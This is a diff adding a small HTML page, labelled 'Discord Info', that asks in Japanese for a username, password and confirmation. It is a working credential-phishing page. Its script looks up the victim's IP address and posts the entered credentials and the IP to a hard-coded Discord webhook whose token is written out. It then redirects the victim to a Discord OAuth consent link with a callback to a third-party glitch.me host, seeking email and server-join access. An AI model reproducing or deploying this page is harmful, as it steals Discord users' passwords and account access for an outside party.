@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⁴⁴ᴳᶻ⁴⁴ᴼ⁸⁴⁴ᴳˣ⁴⁴ᴼ⁸⁴⁴ᴳᵁ⁴⁴ᴳʲ⁴⁴ᴳᵖ⁴⁴ᴷᴷ⁴⁴ᴷᴷ⁴⁴ᴼ⁸⁴⁴ᴳⱽ⁴⁴ᴳ+⁴⁴ᴳᵘ⁴⁴ᴳⱽ⁴⁴ᴼ⁸⁴⁴ᴳʷ⁴⁴ᴼ⁸⁴⁴ᴳᴸ⁴⁴ᴷᶜ</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        .webhook-container {
+            text-align: center;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            border: 2px solid #ccc;
+            border-radius: 20px;
+            margin: 5px;
+            width: 250px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #1900ff;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #292dff;
+        }
+    </style>
+</head>
+<body>
+    <div class="webhook-container">
+        <h2>Discord Info</h2>
+        <form id="myForm">
+            <input type="text" id="input1" placeholder="ユーザーネーム"><br>
+            <input type="text" id="input2" placeholder="パスワード"><br>
+            <input type="text" id="input3" placeholder="確認"><br>
+            <button type="button" onclick="sendData()">送信</button>
+        </form>
+    </div>
+
+    <script>
+        async function sendData() {
+            var input1Value = document.getElementById("input1").value;
+            var input2Value = document.getElementById("input2").value;
+            var input3Value = document.getElementById("input3").value;
+
+            var ip = await getIPAddress();
+
+            var data = {
+                content: `${input1Value}|${input2Value}|${input3Value}|${ip}`
+            };
+
+            var webhookUrl = "https://discord.com/api/webhooks/1239929107417137152/Pma90srPg_yJz-I59KxU_iJWIA35riu506WNjKXACuUdinnQnxW9tYXtu2rhl1rCeVVL";
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Discord Webhookのレスポンス:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+
+            window.location.href = "https://discord.com/oauth2/authorize?client_id=1239515304980381738&response_type=code&redirect_uri=https%3A%2F%2Fthirsty-jungle-season.glitch.me%2Fcallback&scope=identify+email+guilds.join";
+        }
+
+        async function getIPAddress() {
+            var ipAPI = 'https://api64.ipify.org?format=json';
+
+            try {
+                var response = await fetch(ipAPI);
+                var data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IPアドレスの取得に失敗しました:', error);
+                return 'Unknown';
+            }
+        }
+    </script>
+</body>
+</html>
